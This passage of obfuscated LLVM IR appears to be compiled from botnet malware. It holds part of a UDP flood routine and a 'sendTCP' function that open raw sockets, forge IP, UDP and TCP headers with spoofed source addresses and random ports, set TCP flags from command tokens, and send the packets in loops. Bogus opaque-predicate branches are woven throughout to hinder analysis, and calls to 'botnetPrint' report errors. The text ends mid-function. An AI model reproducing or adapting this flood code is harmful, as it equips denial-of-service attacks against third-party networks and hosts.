  %633 = icmp ne i32 %632, 0
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %258
  store i32 1, i32* %25, align 4
  %634 = load i32, i32* %24, align 4
  %635 = bitcast i32* %25 to i8*
  %636 = call i32 @setsockopt(i32 %634, i32 0, i32 3, i8* %635, i32 4) #3
  %637 = icmp slt i32 %636, 0
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %283
  %638 = load i32, i32* %26, align 4
  %_49 = sub i32 0, %638
  %gen50 = add i32 %_49, -1
  %_51 = shl i32 %638, -1
  %_52 = shl i32 %638, -1
  %_53 = shl i32 %638, -1
  %_54 = sub i32 %638, -1
  %gen55 = mul i32 %_54, -1
  %_56 = shl i32 %638, -1
  %639 = add nsw i32 %638, -1
  store i32 %639, i32* %26, align 4
  %640 = icmp ne i32 %638, 0
  br label %originalBB48

originalBB60alteredBB:                            ; preds = %originalBB60, %303
  %641 = call i64 @time(i64* null) #3
  %642 = call i32 @rand_cmwc()
  %643 = zext i32 %642 to i64
  %_61 = shl i64 %641, %643
  %_62 = sub i64 0, %641
  %gen63 = add i64 %_62, %643
  %_64 = sub i64 0, %641
  %gen65 = add i64 %_64, %643
  %_66 = sub i64 0, %641
  %gen67 = add i64 %_66, %643
  %644 = xor i64 %641, %643
  %645 = trunc i64 %644 to i32
  call void @srand(i32 %645) #3
  %646 = call i32 @rand() #3
  call void @init_rand(i32 %646)
  br label %originalBB60

originalBB71alteredBB:                            ; preds = %originalBB71, %330
  %647 = load i32, i32* %12, align 4
  %_72 = sub i32 32, %647
  %gen73 = mul i32 %_72, %647
  %_74 = sub i32 32, %647
  %gen75 = mul i32 %_74, %647
  %_76 = shl i32 32, %647
  %_77 = sub i32 32, %647
  %gen78 = mul i32 %_77, %647
  %_79 = shl i32 32, %647
  %_80 = shl i32 32, %647
  %648 = sub nsw i32 32, %647
  %_81 = sub i32 0, 1
  %gen82 = add i32 %_81, %648
  %649 = shl i32 1, %648
  %_83 = sub i32 %649, 1
  %gen84 = mul i32 %_83, 1
  %_85 = sub i32 %649, 1
  %gen86 = mul i32 %_85, 1
  %_87 = sub i32 %649, 1
  %gen88 = mul i32 %_87, 1
  %_89 = sub i32 %649, 1
  %gen90 = mul i32 %_89, 1
  %_91 = sub i32 %649, 1
  %gen92 = mul i32 %_91, 1
  %_93 = sub i32 0, %649
  %gen94 = add i32 %_93, 1
  %_95 = sub i32 %649, 1
  %gen96 = mul i32 %_95, 1
  %_97 = sub i32 %649, 1
  %gen98 = mul i32 %_97, 1
  %_99 = sub i32 0, %649
  %gen100 = add i32 %_99, 1
  %650 = sub nsw i32 %649, 1
  %_101 = sub i32 %650, -1
  %gen102 = mul i32 %_101, -1
  %_103 = shl i32 %650, -1
  %651 = xor i32 %650, -1
  store i32 %651, i32* %27, align 4
  br label %originalBB71

originalBB107alteredBB:                           ; preds = %originalBB107, %352
  %652 = load i32, i32* %13, align 4
  %653 = sext i32 %652 to i64
  %_108 = shl i64 28, %653
  %_109 = sub i64 28, %653
  %gen110 = mul i64 %_109, %653
  %_111 = sub i64 0, 28
  %gen112 = add i64 %_111, %653
  %_113 = sub i64 28, %653
  %gen114 = mul i64 %_113, %653
  %_115 = sub i64 28, %653
  %gen116 = mul i64 %_115, %653
  %_117 = sub i64 28, %653
  %gen118 = mul i64 %_117, %653
  %654 = add i64 28, %653
  %655 = call i8* @llvm.stacksave()
  store i8* %655, i8** %28, align 8
  %656 = alloca i8, i64 %654, align 16
  %657 = bitcast i8* %656 to %struct.iphdr*
  store %struct.iphdr* %657, %struct.iphdr** %29, align 8
  %658 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %659 = bitcast %struct.iphdr* %658 to i8*
  %660 = getelementptr i8, i8* %659, i64 20
  %661 = bitcast i8* %660 to %struct.udphdr*
  store %struct.udphdr* %661, %struct.udphdr** %30, align 8
  %662 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %663 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %664 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %663, i32 0, i32 0
  %665 = load i32, i32* %664, align 4
  %666 = load i32, i32* %27, align 4
  %667 = call i32 @GRIP(i32 %666)
  %668 = call i32 @htonl(i32 %667) #10
  %669 = load i32, i32* %13, align 4
  %670 = sext i32 %669 to i64
  %671 = add i64 8, %670
  %672 = trunc i64 %671 to i32
  call void @makeIPPacket(%struct.iphdr* %662, i32 %665, i32 %668, i8 zeroext 17, i32 %672)
  %673 = load i32, i32* %13, align 4
  %674 = sext i32 %673 to i64
  %_119 = sub i64 8, %674
  %gen120 = mul i64 %_119, %674
  %675 = add i64 8, %674
  %676 = trunc i64 %675 to i16
  %677 = call zeroext i16 @htons(i16 zeroext %676) #10
  %678 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %679 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %678, i32 0, i32 0
  %680 = bitcast %union.anon.1* %679 to %struct.anon.3*
  %681 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %680, i32 0, i32 2
  store i16 %677, i16* %681, align 2
  %682 = call i32 @rand_cmwc()
  %683 = trunc i32 %682 to i16
  %684 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %685 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %684, i32 0, i32 0
  %686 = bitcast %union.anon.1* %685 to %struct.anon.3*
  %687 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %686, i32 0, i32 0
  store i16 %683, i16* %687, align 2
  %688 = load i32, i32* %10, align 4
  %689 = icmp eq i32 %688, 0
  br label %originalBB107

originalBB124alteredBB:                           ; preds = %originalBB124, %407
  %690 = call i32 @rand_cmwc()
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %425
  %691 = load i32, i32* %10, align 4
  %692 = trunc i32 %691 to i16
  %693 = call zeroext i16 @htons(i16 zeroext %692) #10
  %694 = zext i16 %693 to i32
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %475
  %695 = load i32, i32* %24, align 4
  %696 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %697 = call i64 @sendto(i32 %695, i8* %365, i64 %363, i32 0, %struct.sockaddr* %696, i32 16)
  %698 = call i32 @rand_cmwc()
  %699 = trunc i32 %698 to i16
  %700 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %701 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %700, i32 0, i32 0
  %702 = bitcast %union.anon.1* %701 to %struct.anon.3*
  %703 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %702, i32 0, i32 0
  store i16 %699, i16* %703, align 2
  %704 = load i32, i32* %10, align 4
  %705 = icmp eq i32 %704, 0
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %503
  %706 = call i32 @rand_cmwc()
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %558
  br label %originalBB140
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i32 @usleep(i32) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.93
  %46 = load i32, i32* @y.94
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.93
  %54 = load i32, i32* @y.94
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %550

; <label>:61:                                     ; preds = %39
  %62 = load i32, i32* @x.93
  %63 = load i32, i32* @y.94
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %71 = getelementptr inbounds [8 x i8], [8 x i8]* %70, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 8, i32 4, i1 false)
  %72 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %72, i32* %17, align 4
  %73 = load i32, i32* %17, align 4
  %74 = icmp ne i32 %73, 0
  %75 = load i32, i32* @x.93
  %76 = load i32, i32* @y.94
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %86, label %83

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = load i32, i32* @KadenCommStock, align 4
  %85 = call i32 (i32, i8*, ...) @botnetPrint(i32 %84, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.251, i32 0, i32 0))
  br label %550

; <label>:86:                                     ; preds = %originalBBpart24
  store i32 1, i32* %18, align 4
  %87 = load i32, i32* %17, align 4
  %88 = bitcast i32* %18 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #3
  %90 = icmp slt i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* @KadenCommStock, align 4
  %93 = call i32 (i32, i8*, ...) @botnetPrint(i32 %92, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.252, i32 0, i32 0))
  br label %550

; <label>:94:                                     ; preds = %86
  %95 = load i32, i32* %11, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %114

; <label>:97:                                     ; preds = %94
  %98 = load i32, i32* @x.93
  %99 = load i32, i32* @y.94
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  store i32 0, i32* %19, align 4
  %106 = load i32, i32* @x.93
  %107 = load i32, i32* @y.94
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %120

; <label>:114:                                    ; preds = %94
  %115 = load i32, i32* %11, align 4
  %116 = sub nsw i32 32, %115
  %117 = shl i32 1, %116
  %118 = sub nsw i32 %117, 1
  %119 = xor i32 %118, -1
  store i32 %119, i32* %19, align 4
  br label %120

; <label>:120:                                    ; preds = %114, %originalBBpart28
  %121 = load i32, i32* %13, align 4
  %122 = sext i32 %121 to i64
  %123 = add i64 40, %122
  %124 = call i8* @llvm.stacksave()
  store i8* %124, i8** %20, align 8
  %125 = alloca i8, i64 %123, align 16
  %126 = bitcast i8* %125 to %struct.iphdr*
  store %struct.iphdr* %126, %struct.iphdr** %21, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = getelementptr i8, i8* %128, i64 20
  %130 = bitcast i8* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %22, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %133 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 4
  %135 = load i32, i32* %19, align 4
  %136 = call i32 @GRIP(i32 %135)
  %137 = call i32 @htonl(i32 %136) #10
  %138 = load i32, i32* %13, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 20, %139
  %141 = trunc i64 %140 to i32
  call void @makeIPPacket(%struct.iphdr* %131, i32 %134, i32 %137, i8 zeroext 6, i32 %141)
  %142 = call i32 @rand_cmwc()
  %143 = trunc i32 %142 to i16
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon* %145 to %struct.anon.0*
  %147 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %146, i32 0, i32 0
  store i16 %143, i16* %147, align 4
  %148 = call i32 @rand_cmwc()
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 2
  store i32 %148, i32* %152, align 4
  %153 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon* %154 to %struct.anon.0*
  %156 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %155, i32 0, i32 3
  store i32 0, i32* %156, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon* %158 to %struct.anon.0*
  %160 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %159, i32 0, i32 4
  %161 = load i16, i16* %160, align 4
  %162 = and i16 %161, -241
  %163 = or i16 %162, 80
  store i16 %163, i16* %160, align 4
  %164 = load i8*, i8** %12, align 8
  %165 = call i32 @strcmp(i8* %164, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.253, i32 0, i32 0)) #9
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %219, label %167

; <label>:167:                                    ; preds = %120
  %168 = load i32, i32* @x.93
  %169 = load i32, i32* @y.94
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %167
  %176 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon* %177 to %struct.anon.0*
  %179 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %178, i32 0, i32 4
  %180 = load i16, i16* %179, align 4
  %181 = and i16 %180, -513
  %182 = or i16 %181, 512
  store i16 %182, i16* %179, align 4
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon* %184 to %struct.anon.0*
  %186 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon* %191 to %struct.anon.0*
  %193 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  %197 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon* %198 to %struct.anon.0*
  %200 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %201, -4097
  %203 = or i16 %202, 4096
  store i16 %203, i16* %200, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon* %205 to %struct.anon.0*
  %207 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -2049
  %210 = or i16 %209, 2048
  store i16 %210, i16* %207, align 4
  %211 = load i32, i32* @x.93
  %212 = load i32, i32* @y.94
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart261, label %originalBB10alteredBB

originalBBpart261:                                ; preds = %originalBB10
  br label %392

; <label>:219:                                    ; preds = %120
  %220 = load i8*, i8** %12, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %221, i8** %23, align 8
  br label %222

; <label>:222:                                    ; preds = %389, %219
  %223 = load i8*, i8** %23, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %391

; <label>:225:                                    ; preds = %222
  %226 = load i32, i32* @x.93
  %227 = load i32, i32* @y.94
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %225
  %234 = load i8*, i8** %23, align 8
  %235 = call i32 @strcmp(i8* %234, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.255, i32 0, i32 0)) #9
  %236 = icmp ne i32 %235, 0
  %237 = load i32, i32* @x.93
  %238 = load i32, i32* @y.94
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %236, label %253, label %245

; <label>:245:                                    ; preds = %originalBBpart265
  %246 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon* %247 to %struct.anon.0*
  %249 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %250, -513
  %252 = or i16 %251, 512
  store i16 %252, i16* %249, align 4
  br label %389

; <label>:253:                                    ; preds = %originalBBpart265
  %254 = load i8*, i8** %23, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.256, i32 0, i32 0)) #9
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %265, label %257

; <label>:257:                                    ; preds = %253
  %258 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon* %259 to %struct.anon.0*
  %261 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -1025
  %264 = or i16 %263, 1024
  store i16 %264, i16* %261, align 4
  br label %388

; <label>:265:                                    ; preds = %253
  %266 = load i8*, i8** %23, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.257, i32 0, i32 0)) #9
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %277, label %269

; <label>:269:                                    ; preds = %265
  %270 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon* %271 to %struct.anon.0*
  %273 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %274, -257
  %276 = or i16 %275, 256
  store i16 %276, i16* %273, align 4
  br label %371

; <label>:277:                                    ; preds = %265
  %278 = load i32, i32* @x.93
  %279 = load i32, i32* @y.94
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %277
  %286 = load i8*, i8** %23, align 8
  %287 = call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.258, i32 0, i32 0)) #9
  %288 = icmp ne i32 %287, 0
  %289 = load i32, i32* @x.93
  %290 = load i32, i32* @y.94
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %288, label %305, label %297

; <label>:297:                                    ; preds = %originalBBpart269
  %298 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon* %299 to %struct.anon.0*
  %301 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = and i16 %302, -4097
  %304 = or i16 %303, 4096
  store i16 %304, i16* %301, align 4
  br label %370

; <label>:305:                                    ; preds = %originalBBpart269
  %306 = load i32, i32* @x.93
  %307 = load i32, i32* @y.94
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %305
  %314 = load i8*, i8** %23, align 8
  %315 = call i32 @strcmp(i8* %314, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.259, i32 0, i32 0)) #9
  %316 = icmp ne i32 %315, 0
  %317 = load i32, i32* @x.93
  %318 = load i32, i32* @y.94
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %316, label %349, label %325

; <label>:325:                                    ; preds = %originalBBpart273
  %326 = load i32, i32* @x.93
  %327 = load i32, i32* @y.94
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %325
  %334 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %335 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %334, i32 0, i32 0
  %336 = bitcast %union.anon* %335 to %struct.anon.0*
  %337 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %336, i32 0, i32 4
  %338 = load i16, i16* %337, align 4
  %339 = and i16 %338, -2049
  %340 = or i16 %339, 2048
  store i16 %340, i16* %337, align 4
  %341 = load i32, i32* @x.93
  %342 = load i32, i32* @y.94
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart297, label %originalBB75alteredBB

originalBBpart297:                                ; preds = %originalBB75
  br label %369

; <label>:349:                                    ; preds = %originalBBpart273
  %350 = load i32, i32* @x.93
  %351 = load i32, i32* @y.94
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %349
  %358 = load i32, i32* @KadenCommStock, align 4
  %359 = load i8*, i8** %23, align 8
  %360 = call i32 (i32, i8*, ...) @botnetPrint(i32 %358, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.260, i32 0, i32 0), i8* %359)
  %361 = load i32, i32* @x.93
  %362 = load i32, i32* @y.94
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %369

; <label>:369:                                    ; preds = %originalBBpart2101, %originalBBpart297
  br label %370

; <label>:370:                                    ; preds = %369, %297
  br label %371

; <label>:371:                                    ; preds = %370, %269
  %372 = load i32, i32* @x.93
  %373 = load i32, i32* @y.94
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %371
  %380 = load i32, i32* @x.93
  %381 = load i32, i32* @y.94
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %388

; <label>:388:                                    ; preds = %originalBBpart2105, %257
  br label %389

; <label>:389:                                    ; preds = %388, %245
  %390 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %390, i8** %23, align 8
  br label %222

; <label>:391:                                    ; preds = %222
  br label %392

; <label>:392:                                    ; preds = %391, %originalBBpart261
  %393 = load i32, i32* @x.93
  %394 = load i32, i32* @y.94
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
